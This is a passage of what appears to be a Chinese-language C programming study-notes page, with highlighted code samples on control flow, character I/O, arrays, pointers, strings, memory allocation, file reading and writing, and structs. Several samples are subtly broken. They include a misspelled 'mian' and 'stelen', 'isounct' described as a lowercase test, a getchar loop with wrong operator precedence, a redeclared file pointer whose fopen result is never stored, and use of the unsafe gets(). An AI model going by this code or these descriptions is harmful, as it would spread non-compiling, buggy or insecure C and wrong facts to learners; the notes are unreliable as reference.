判断参数是否为空白字符</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">//iscntrl 判断参数是否为控制符</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">//isdigit 判断参数是否为十进制数字字符</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">//isgraph 判断参数是否为可打印字符</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">//isprint 判断参数是否为可打印字符（含空格）</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">//isounct 判断参数是否为小写字符</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token comment">//isspace 判断参数是否为空白字符</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">//&amp;&amp; || !</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token comment">//and or not</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token comment">//!(4>7) 取反运算符</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token comment">//?: 判断运算符</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token comment">//contuine 跳出本次循环，执行下一次循环</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token comment">//break 跳出大循环，直接到后面执行</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token comment">//switch</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>flag <span class="token comment">/*expression*/</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token comment">/* constant-expression */</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token comment">//goto 语句会破坏程序的执行结构</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    loop<span class="token operator">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">goto</span> loop<span class="token punctuation">;</span><span class="token comment">// 跳到 loop 继续执行</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="字符的输入输出"><a class="anchor" href="#字符的输入输出">#</a> 字符的输入输出</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">mian</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//getchar</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//putchar</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> str<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'#'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token function">putchar</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="数组和指针"><a class="anchor" href="#数组和指针">#</a> 数组和指针</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// 数组：一组类型的变量所组成的集合</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//number [0] 首元素</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//number [9] 最后一个元素</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> number<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 一维数组</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">// 多维数组</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> number1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 相当于三个 5 元素的一维数组</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        number1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    </pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment">// 指针</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">//&amp; 取地址运算符</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token comment">//* 间接运算符</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">//&amp; 变量名</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">int</span> number2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">int</span> <span class="token operator">*</span> pnum <span class="token operator">=</span> <span class="token operator">&amp;</span>number2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token operator">*</span>pnum <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">// 指针地址 +1 = 加一个类型长度</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">// 指针地址 + sizeof (int);</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"变量number2的值和地址是：%d, %x"</span><span class="token punctuation">,</span>number2<span class="token punctuation">,</span><span class="token operator">&amp;</span>number2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="字符串和字符串函数"><a class="anchor" href="#字符串和字符串函数">#</a> 字符串和字符串函数</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//gets puts</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">char</span> szStr<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"My name is 21r000"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">char</span> szStr1<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">gets</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">//fgets fputs</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">char</span> szStr2<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">fgets</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">fputs</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">//strcat</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">char</span> szStr3<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">strcat</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span>szStr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 拼接字符串</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">strncat</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span>szStr3<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">//strcmp</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">strcmp</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span>szStr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="储存类-链接和内存管理"><a class="anchor" href="#储存类-链接和内存管理">#</a> 储存类、、链接和内存管理</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> c<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">char</span> szStr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"My name is 21r000"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span> szStr1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    szStr1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 申请内存</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">strcpy</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">,</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//free 释放</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">// 静态储存时期</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// 自动储存时期</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// 寄存器 register</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">// 具有外部链接的静态存储类 extern</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// 具有内部链接的静态储存类 static</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// 空连接的静态储存类 static</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">// malloc free</span></pre></td></tr></table></figure><h2 id="文件操作"><a class="anchor" href="#文件操作">#</a> 文件操作</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">// 读取</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    FILE <span class="token operator">*</span> pFile<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span> szReadTextBuffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> nReadFileSize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> nReadRetsize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">//r 读取，w 写出，b 二进制</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open file failed！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    nReadFileSize <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    szReadTextBuffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>nReadFileSize <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>szReadTextBuffer <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc memory failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>nReadFileSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    nReadRetsize <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>nReadFileSize<span class="token punctuation">,</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>nReadRetsize <span class="token operator">!=</span> nReadFileSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Read file failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token function">fclose</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">// 写出</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span> szWriteBuffer <span class="token operator">=</span> <span class="token string">"21r000"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">int</span> nWriteSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    FILE <span class="token operator">*</span> pFile<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test1.txt"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>pFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token function">fwrite</span><span class="token punctuation">(</span>szWriteBuffer<span class="token punctuation">,</span><span class="token function">stelen</span><span class="token punctuation">(</span>szWriteBuffer<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token function">fclose</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="结构体-联合体和枚举类型"><a class="anchor" href="#结构体-联合体和枚举类型">#</a> 结构体、联合体和枚举类型</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">GamePlayerInfo</span> <span class="token comment">// 结构体</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">char</span> PlayerName<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> HP<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> MP<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">float</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">float</span> y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">float</span> z<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">union</span> info <span class="token comment">// 联合体</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">char</span> PlayName<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> MP<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">float</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span 